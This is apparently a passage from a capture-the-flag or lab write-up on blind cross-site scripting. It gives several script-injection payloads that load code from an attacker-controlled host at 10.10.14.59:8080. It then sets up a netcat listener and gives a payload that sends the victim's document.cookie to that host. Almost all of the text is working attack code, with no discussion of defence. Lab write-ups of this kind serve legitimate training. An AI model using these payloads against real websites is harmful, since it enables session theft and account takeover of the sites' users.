Let's start with sending some payload in the various fields to submit a info, this will be a blind XSS so we need to setup a listener to, Let's try these payloads:

```
'><script src=http://10.10.14.59:8080/website></script>
"><script src=http://10.10.14.59:8080/website></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.14.59:8080/website\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.59:8080/website");a.send();</script>
<script>$.getScript("http://10.10.14.59:8080/website")</script>
```

We found the first payload works with the `website` field. Let's now inject some payload to steal the cookie:

First setup the listener:
```
nc -nlvp 8080
```

Then send the below payload in the website field and submit the form:
```
'><script>new Image().src='http://10.10.14.59:8080?c='+document.cookie;</script>
```

After a few seconds you should receive the payload with the cookie!


